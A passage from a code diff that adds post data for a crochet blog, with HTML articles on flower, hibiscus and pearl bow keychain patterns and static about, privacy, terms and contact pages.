+<p>Crochet bows are endlessly adaptable across seasons and styles. Sew them onto knitted beanies for cozy winter gifts, glue them to canvas sneakers for a quirky fashion statement, or string several along thin elastic cord to create a charming bow choker necklace. For craft fair sellers, a coordinated trio of bows in the same color family presented on a branded backing card makes an irresistible impulse purchase.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:22px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Crochet Bow Pattern</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Hair Accessories</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Bow</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">DIY Hair Clip</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Crochet Embellishment</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Craft Fair Bestseller</span>
+</div>
+`
+            },
+            {
+                id: 'the-sixth-post',
+                title: 'Crochet Flower Keychain Pattern',
+                date: 'August 20, 2026',
+                category: 'Keychains & Charms',
+                image: './assets/Crochet Flower Keychain Pattern.png',
+                isNew: false,
+                excerpt: 'Brighten up your keys, handbag, and everyday carry with this delightful crochet flower keychain pattern! 🌸 Each charming bloom is built from a flat disc center outward through six rounded petals, finished with a decorative button heart and a sturdy lobster clasp attachment.\n\n• Compact 5 cm finished size that works up in under an hour\n• Easily customized in any color palette from soft pastels to rich jewel tones\n\nSave this pin and add a handmade floral touch to everything you carry! 🌿 #CrochetKeychain #FlowerPattern #CrochetCharm #HandmadeAccessories #YarnCrafts',
+                content: `
+<p>There is something deeply satisfying about creating a miniature floral masterpiece that travels with you throughout the day. Attached to your key ring, dangling from a handbag zipper, or clipped to a school backpack, a handcrafted crochet flower keychain transforms an everyday functional object into a tiny work of wearable botanical art. This approachable pattern produces a beautifully layered bloom measuring approximately 5 cm across, complete with a dimensional petal structure, a charming button center, and secure lobster clasp hardware.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:22px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;line-height:1.8;color:#334155;">
+    <li>Compact 5 cm finished diameter — lightweight and perfectly balanced on any key ring.</li>
+    <li>Layered two-tier petal construction creates natural depth and a realistic floral profile.</li>
+    <li>Decorative button center adds texture and a charming artisan finishing detail.</li>
+    <li>Gold lobster clasp hardware provides sturdy, swivel-clip attachment to any loop or ring.</li>
+    <li>Works up in under one hour — an ideal beginner project and fast gift solution.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:28px;line-height:1.3;margin:36px 0 16px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Anatomy of the Flower Keychain</h2>
+<p>The keychain is constructed in three clearly defined stages that build the bloom from its core outward.</p>
+
+<h3 style="font-size:22px;line-height:1.4;margin:26px 0 12px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1. The Magic Ring Foundation</h3>
+<p>Begin with a tight adjustable magic ring and work six single crochets into the center. This creates a perfectly round, gapless base from which both petal layers will emerge. Close the ring snugly to prevent any visible hole at the flower center.</p>
+
+<h3 style="font-size:22px;line-height:1.4;margin:26px 0 12px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">2. The Double Petal Layers</h3>
+<p>The first petal ring is worked into the initial six stitches using shells of three double crochets to create broad, rounded outer petals. The second, inner petal layer is added in a slightly raised position by working into the back loops of round one, producing a naturally overlapping layered silhouette that mimics a real garden bloom.</p>
+
+<h3 style="font-size:22px;line-height:1.4;margin:26px 0 12px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">3. The Button Center and Hardware</h3>
+<p>A vintage-style or novelty button sewn through the center of the magic ring adds texture and focal interest. A short crocheted chain attached to the back of the flower is finished with a gold jump ring and lobster clasp, creating a functional, secure attachment point.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Always sew the button center from the back of the magic ring outward, passing through the fabric twice before knotting. This prevents the button from shifting off-center during daily use and key movement.</p>
+
+<h2 style="font-size:28px;line-height:1.3;margin:36px 0 16px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Materials and Color Inspiration</h2>
+
+<h4 style="font-size:18px;line-height:1.4;margin:20px 0 10px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Recommended Thread and Yarn</h4>
+<ul>
+  <li><strong>Size 10 Mercerized Cotton Thread:</strong> Produces the crispest stitch definition and the most realistic, structured petal shape.</li>
+  <li><strong>Fingering or Sock Weight Cotton:</strong> Creates a slightly softer, more plush petal texture — ideal for a cottagecore or hand-dyed yarn aesthetic.</li>
+  <li><strong>Color Palette Ideas:</strong> Blush and ivory, sunflower yellow with sage center, lavender with gold button, or bold coral with a white button heart.</li>
+</ul>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Apply a small drop of clear-drying fabric stiffener to the finished petals before shaping and drying. This gives the flower permanent body so the petals always stay lifted and never droop flat against the key ring.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:22px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance: Flower Keychain Specs</h3>
+  <ul style="margin:0;padding-left:20px;line-height:1.8;color:#334155;">
+    <li><strong>Finished Size:</strong> Approx. 5 cm diameter bloom</li>
+    <li><strong>Skill Level:</strong> Beginner Friendly</li>
+    <li><strong>Estimated Time:</strong> 30–55 minutes per keychain</li>
+    <li><strong>Hook Size:</strong> 1.5–2.0 mm steel or 2.5 mm aluminum</li>
+    <li><strong>Hardware:</strong> 1 lobster clasp + 1 jump ring (gold or silver)</li>
+  </ul>
+</div>
+
+<h2 style="font-size:28px;line-height:1.3;margin:36px 0 16px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Gifting and Selling Ideas</h2>
+<p>Crochet flower keychains are perennial bestsellers at craft markets and on handmade platforms. Bundle three keychains in complementary colors inside a small organza bag for a stunning birthday or thank-you gift. Package them on botanical backing cards for your Etsy shop photography, or create a seasonal rotation of colors to keep your inventory fresh and appealing throughout the year.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:22px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Crochet Keychain</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Flower Crochet Pattern</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Charm</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Bag Charm DIY</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cottagecore Accessories</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Quick Crochet Gift</span>
+</div>
+`
+            },
+            {
+                id: 'the-seventh-post',
+                title: 'Crochet Hibiscus Flower Keychain',
+                date: 'August 20, 2026',
+                category: 'Keychains & Charms',
+                image: './assets/Crochet Hibiscus Flower Keychain for a Cute Handmade Everyday Accessory.png',
+                isNew: true,
+                excerpt: 'Capture the lush beauty of tropical flora with this stunning crochet hibiscus flower keychain! 🌺 Worked in vibrant scarlet, coral, or fuchsia thread with a contrasting raised staminal column and five overlapping petals, this miniature botanical masterpiece makes an unforgettable handmade everyday accessory.\n\n• Realistic five-petal hibiscus silhouette with a dimensional 3D staminal column detail\n• Lightweight and durable on any key ring, bag zipper pull, or lanyard attachment\n\nBring a touch of tropical paradise to your everyday carry! 🌿 #HibiscusCrochet #TropicalFlower #CrochetKeychain #HandmadeAccessories #BotanicalCrochet',
+                content: `
+<p>The hibiscus is one of nature's most dramatic and recognizable blooms, beloved for its five bold petals that fan outward around a prominent staminal column. Capturing that iconic tropical silhouette in miniature crochet form requires thoughtful construction, and this pattern delivers precisely that: a compact, structurally accurate hibiscus keychain that looks stunning on key rings, lanyard clips, zipper pulls, and bag straps. Worked in vibrant thread with a contrasting stamen stem, this accessory is a miniature botanical showpiece you will be proud to carry every single day.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:22px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;line-height:1.8;color:#334155;">
+    <li>Realistic five-petal hibiscus construction with dimensional overlapping petal shaping.</li>
+    <li>Raised tubular staminal column worked in contrasting thread for authentic botanical detail.</li>
+    <li>Finished diameter of approximately 6 cm — substantial but lightweight as an everyday carry charm.</li>
+    <li>Adjustable petal angle through blocking allows customization of the bloom's openness.</li>
+    <li>Suitable for beginner crocheters comfortable with magic rings and basic increases.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:28px;line-height:1.3;margin:36px 0 16px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Constructing the Hibiscus Bloom</h2>
+<p>The hibiscus keychain is built in four distinct stages that layer from the botanical center outward to the dramatic petal tips.</p>
+
+<h3 style="font-size:22px;line-height:1.4;margin:26px 0 12px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1. The Staminal Column</h3>
+<p>The central stamen tube is the first element crocheted. Begin with a tight magic ring and work a tubular column of approximately 12 to 14 rounds of single crochets in a contrasting thread color, typically white, cream, or yellow. Stuff the column lightly with a tiny roll of fiberfill or a short piece of cotton yarn to keep it upright and dimensional.</p>
+
+<h3 style="font-size:22px;line-height:1.4;margin:26px 0 12px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">2. Joining the Five Petals</h3>
+<p>Each petal is worked separately as a flattened oval — chains forming the spine, with increasing double crochets along one side and decreasing stitches on the return to create the tapered tip. Once all five petals are complete, they are joined sequentially around the base of the staminal column, evenly spaced to recreate the authentic radial hibiscus silhouette.</p>
+
+<h3 style="font-size:22px;line-height:1.4;margin:26px 0 12px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">3. The Calyx Base</h3>
+<p>A small worked flat star in deep green thread is stitched behind the petal join to represent the hibiscus calyx. This element is optional but adds significant realism and also helps stabilize the petal arrangement against the key ring hardware.</p>
+
+<h3 style="font-size:22px;line-height:1.4;margin:26px 0 12px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">4. Hardware and Final Assembly</h3>
+<p>A short crocheted loop is attached at the back of the calyx and reinforced with a metal jump ring. A swivel lobster clasp completes the assembly, allowing the bloom to rotate freely and always face forward on the key ring.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> For the most realistic petal shape, pin each finished petal to a foam blocking mat and spray with a diluted fabric stiffener solution. Allow to dry fully before joining to the stamen column. This ensures the petals fan outward naturally rather than drooping downward.</p>
+
+<h2 style="font-size:28px;line-height:1.3;margin:36px 0 16px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Colors and Material Suggestions</h2>
+
+<h4 style="font-size:18px;line-height:1.4;margin:20px 0 10px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Tropical Color Palettes</h4>
+<ul>
+  <li><strong>Classic Hawaiian Red:</strong> Scarlet petal thread, cream stamen column, forest green calyx. Bold and instantly recognizable.</li>
+  <li><strong>Sunset Coral Fade:</strong> Warm coral thread with a subtle orange gradient tip if using hand-dyed yarn, paired with a golden stamen.</li>
+  <li><strong>Tropical Fuchsia:</strong> Vibrant magenta or hot pink thread paired with a white or pale yellow stamen — a favorite for summer market stalls.</li>
+  <li><strong>Peach Mango Dream:</strong> Soft peachy orange thread with a contrasting butter yellow staminal column for a gentle, warm aesthetic.</li>
+</ul>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> When joining petals around the stamen column, work each petal attachment seam on the wrong side using a tapestry needle and matching thread rather than slip-stitching with your hook. This creates an invisible, flat join that keeps the front face of the bloom perfectly clean and crease-free.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:22px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance: Hibiscus Keychain Specs</h3>
+  <ul style="margin:0;padding-left:20px;line-height:1.8;color:#334155;">
+    <li><strong>Finished Bloom Diameter:</strong> Approx. 6 cm</li>
+    <li><strong>Skill Level:</strong> Beginner to Intermediate</li>
+    <li><strong>Project Time:</strong> 1 to 1.5 hours per keychain</li>
+    <li><strong>Hook Size:</strong> 1.5–2.0 mm steel hook</li>
+    <li><strong>Thread:</strong> Size 10 mercerized cotton (main) + contrasting (stamen)</li>
+  </ul>
+</div>
+
+<h2 style="font-size:28px;line-height:1.3;margin:36px 0 16px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Gifting and Styling</h2>
+<p>The crochet hibiscus keychain is a stunning gift for tropical plant lovers, Hawaii enthusiasts, teachers, and craft fair shoppers seeking something genuinely unique. Pair it with a matching hibiscus hair clip for a coordinated botanical set, or offer customizable color options in your Etsy shop to attract buyers looking for personalized handmade accessories. This pattern rewards a small time investment with a finished piece of extraordinary charm and botanical beauty.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:22px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Hibiscus Crochet</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Tropical Flower Keychain</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Botanical Crochet</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Crochet Charm Pattern</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Accessory</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Miniature Flower Art</span>
+</div>
+`
+            },
+            {
+                id: 'the-eighth-post',
+                title: 'Handmade Pearl Bow Key Ring',
+                date: 'August 21, 2026',
+                category: 'Bows & Embellishments',
+                image: './assets/Handmade Pearl Bow Key Ring Cute Accessory.png',
+                isNew: true,
+                excerpt: 'Add an elegant touch of vintage glamour to your everyday carry with this handmade pearl bow key ring! 🎀 Crafted in crisp ivory or white thread with lustrous faux pearl bead accents along each bow loop, this sophisticated accessory pairs beautifully with leather handbags, tote bags, and car keys.\n\n• Classic bow silhouette with premium faux pearl bead embellishments throughout\n• Finished with a polished gold key ring and lobster clasp for secure attachment\n\nSave this pin for your next weekend project and elevate your everyday essentials! ✨ #PearlBowKeyring #HandmadeKeychain #CrochetBow #VintageAccessories #PearlCrochet',
+                content: `
+<p>In the world of handmade accessories, few designs communicate refined elegance as effortlessly as a bow adorned with pearls. This handmade pearl bow key ring elevates a simple crochet bow into a statement accessory worthy of a luxury boutique window. Worked in crisp ivory or antique white mercerized cotton thread with pre-strung faux pearl beads locked into every stitch loop, the result is a luminous, weighty charm that transforms your daily key ring into a portable fashion moment. The polished gold hardware finish completes the look with understated opulence.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:22px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;line-height:1.8;color:#334155;">
+    <li>Bead crochet technique locks faux pearl beads into every stitch for a fully jeweled bow surface.</li>
+    <li>Worked in ivory or white size 10 cotton thread for a crisp, bright backdrop that enhances pearl luminosity.</li>
+    <li>Polished gold lobster clasp and split key ring hardware provides a premium finished product appearance.</li>
+    <li>The structured bow holds its shape through daily use without requiring stiffening agents.</li>
+    <li>Completed keychain measures approximately 7 cm across — elegant yet compact on any key ring.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:28px;line-height:1.3;margin:36px 0 16px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Bead Crochet Technique</h2>
+<p>The secret behind the all-over pearl texture of this bow lies in pre-loading beads onto the working thread before beginning to crochet. Each pearl bead is slid into position directly before inserting the hook for each stitch, so when the stitch is completed, the bead is secured permanently against the front face of the fabric.</p>
+
+<h3 style="font-size:22px;line-height:1.4;margin:26px 0 12px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 1: Pre-stringing the Pearls</h3>
+<p>Before winding your thread onto a bobbin or butterfly, thread all required beads onto the full ball of working thread using a fine beading needle. The pattern will specify the exact count needed for each bow panel. Once strung, beads are held near the ball and slid forward one by one as needed throughout the crocheting process.</p>
+
+<h3 style="font-size:22px;line-height:1.4;margin:26px 0 12px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 2: Crocheting the Bow Panels</h3>
+<p>Each panel of the bow is worked flat in back loop single crochet rows. Before every stitch, a single pearl bead is pushed to the front of the work and held in place by the new stitch loop. Working consistently through back loops only allows the pearls to sit prominently on the front surface while maintaining smooth, even tension throughout each row.</p>
+
+<h3 style="font-size:22px;line-height:1.4;margin:26px 0 12px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 3: The Center Wrap and Hardware</h3>
+<p>Once both bow panels are complete and joined at the center with a snug wrap band, the split key ring is attached directly to the rear of the bow's center knot using a short crocheted loop reinforced with a gold jump ring. The lobster clasp is threaded onto the key ring for secondary item attachment.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Always use a beading needle with an eye large enough to accommodate doubled thread but fine enough to pass through the drill hole of your pearl beads without force. Forcing an oversized needle through small bead holes can crack the pearl coating and cause beads to split during crocheting.</p>
+
+<h2 style="font-size:28px;line-height:1.3;margin:36px 0 16px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Materials Guide</h2>
+
+<h4 style="font-size:18px;line-height:1.4;margin:20px 0 10px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Thread, Beads, and Hardware</h4>
+<ul>
+  <li><strong>Thread:</strong> Size 10 mercerized cotton in ivory, white, or soft champagne for the most luminous pearl contrast.</li>
+  <li><strong>Hook:</strong> 1.50–1.75 mm steel crochet hook with a comfortable silicone or cushioned grip handle.</li>
+  <li><strong>Pearls:</strong> 4 mm faux pearl beads with a consistent drill hole of at least 0.5 mm. Plastic pearl beads are lighter than glass and gentler on fine thread.</li>
+  <li><strong>Hardware:</strong> 25 mm polished gold split key ring + one 6 mm gold jump ring + one 12 mm gold lobster clasp.</li>
+</ul>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> String approximately 20 percent more beads onto your thread than the pattern calls for. Having surplus beads pre-loaded means you never run short mid-row and never need to splice in new thread with beads in an awkward position.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:22px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance: Pearl Bow Key Ring</h3>
+  <ul style="margin:0;padding-left:20px;line-height:1.8;color:#334155;">
+    <li><strong>Finished Size:</strong> Approx. 7 cm bow width</li>
+    <li><strong>Skill Level:</strong> Intermediate (bead crochet experience helpful)</li>
+    <li><strong>Project Time:</strong> 1.5 to 2 hours per key ring</li>
+    <li><strong>Hook Size:</strong> 1.50–1.75 mm steel hook</li>
+    <li><strong>Special Technique:</strong> Pre-strung bead crochet</li>
+  </ul>
+</div>
+
+<h2 style="font-size:28px;line-height:1.3;margin:36px 0 16px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Gifting and Luxury Presentation</h2>
+<p>The pearl bow key ring positions itself firmly in the premium handmade gift market. Present it on a velvet jewelry display pad inside a small gift box tied with satin ribbon, or slide it into a branded kraft paper envelope with a handwritten note card. It makes a breathtaking bridal shower favor, a hen party gift, a milestone birthday keepsake, or a thoughtful thank-you gesture for a mentor, colleague, or best friend who appreciates refined artisan craftsmanship.</p>
+
+<p>For Etsy sellers, photography of this piece on a clean marble background with dried florals and vintage keys creates aspirational flat-lay content that performs exceptionally well on Pinterest and Instagram, driving consistent traffic to your handmade shop.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:22px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Pearl Bow Keychain</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Bead Crochet</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Vintage Crochet Accessory</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Key Ring</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Pearl Embellishment</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Luxury Handmade Gift</span>
+</div>
+`
+            }
+        ];
+
+
+        // 2. Static Pages (Legal, About, Contact)
+        const pages = {
+            'about': {
+                title: 'About Crochet Accessories Studio',
+                content: `
+                    <p>Welcome to <strong>Crochet Accessories Studio</strong>, a dedicated online haven for fiber artists, jewelry makers, and lovers of handcrafted wearable art.</p>
+                    
+                    <p>Our passion lies in celebrating the delicate, intricate world of wearable crochet. From micro-botanical bracelets and adorable amigurumi wrist companions to vintage Victorian lace fingerless gloves and refined beaded jewelry, we believe that small-scale textile crafting offers endless joy, mindfulness, and creative expression.</p>
+
+                    <h3>Our Mission</h3>
+                    <p>We are on a mission to empower crafters worldwide with high-quality, beginner-accessible, and inspiring crochet designs. We focus on clear tutorials, detailed pattern breakdowns, thoughtful material guides, and styling inspiration that helps you transform simple strands of yarn and thread into cherished heirloom accessories.</p>
+
+                    <h3>What You Will Discover Here</h3>
+                    <ul>
+                        <li><strong>Dainty Crochet Jewelry:</strong> Guides and inspiration for micro-floral garlands, beaded bracelets, chokers, and earrings.</li>
+                        <li><strong>Wearable Accents:</strong> Vintage lace wrist warmers, fingerless mitts, headbands, and seasonal accessories.</li>
+                        <li><strong>Detailed Tutorials:</strong> Step-by-step guidance on hook selection, thread tension, blocking, stiffening, and jewelry hardware mounting.</li>
+                        <li><strong>Creative Community:</strong> A warm, uplifting space to learn, share, and celebrate handmade beauty.</li>
+                    </ul>
+
+                    <p>Thank you for being part of our artisan crafting community. Grab your favorite hook, find a sunny corner, and let us create something beautiful together!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At Crochet Accessories Studio, accessible from our website, one of our main priorities is the privacy of our visitors. This Privacy Policy document details the types of information collected and recorded by us and how we utilize it.</p>
+                    
+                    <h3>Log Files</h3>
+                    <p>Crochet Accessories Studio follows standard procedures for utilizing log files. These files log visitors when they visit websites. The information collected by log files includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of this information is for analyzing trends, administering the site, tracking users' movement on the website, and gathering demographic information.</p>
+
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, Crochet Accessories Studio uses "cookies". These cookies are used to store information including visitors' preferences and the pages on the website that the visitor accessed or visited. The information is used to optimize users' experience by customizing our web page content based on visitors' browser type and other relevant device information.</p>
+
+                    <h3>Google AdSense and Third-Party Advertising</h3>
+                    <p>Third-party ad servers or ad networks use technologies such as cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites on the internet.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to our users based on their visit to our site and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Google Ads Settings</a>. You may also opt out of third-party cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+
+                    <h3>Pinterest, Social Media & Image Sharing</h3>
+                    <p>Our website features social sharing integrations, including Pinterest "Save" buttons and social media links. These features may collect your IP address and which page you are visiting on our site, and may set cookies to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the respective platform.</p>
+
+                    <h3>Children's Online Privacy Protection</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and monitor their online activity. Crochet Accessories Studio does not knowingly collect any Personal Identifiable Information from children under the age of 13. If you believe your child provided this information on our website, please contact us immediately and we will promptly remove such records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and browsing this website, you accept and agree to be bound by the terms and provisions of this agreement. If you do not agree to abide by these terms, please do not use this site.</p>
+                    
+                    <h3>2. User Conduct & Community Guidelines</h3>
+                    <p>Our blog is a respectful, family-friendly sanctuary for makers. You agree to use the site only for lawful purposes and not to engage in any conduct that could compromise site security, damage content, or harass fellow community members.</p>
+
+                    <h3>3. Intellectual Property Rights</h3>
+                    <p>All written articles, tutorials, photography, graphics, and original crochet pattern instructions published on this website are the intellectual property of Crochet Accessories Studio unless otherwise noted. Content is provided for personal, non-commercial use. Unauthorized reproduction, distribution, or commercial exploitation of our patterns and written content without express written consent is strictly prohibited.</p>
+
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. While we strive for accuracy in all crochet instructions, gauge recommendations, and material lists, we make no warranties, expressed or implied, regarding exact project outcomes, skill suitability, or reliability.</p>
+                    
+                    <h3>5. External Third-Party Links</h3>
+                    <p>Our website may contain links to external third-party websites (such as yarn suppliers, craft stores, or social media networks). We do not control or endorse the content, policies, or practices of any third-party websites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Crochet Accessories Studio',
+                content: `
+                    <p>We cherish hearing from fellow crochet enthusiasts, pattern testers, and visitors! Whether you have a question about a stitch technique, want to inquire about pattern collaborations, or need support with website policies, please reach out.</p>
+                    
+                    <div style="background:#F5EFEB;border:1px solid #EDE3D8;padding:24px 28px;border-radius:16px;margin:25px 0;">
+                        <h3 style="margin-top:0;border-left:none;padding-left:0;color:var(--text-heading);font-size:1.3rem;">Get in Touch</h3>
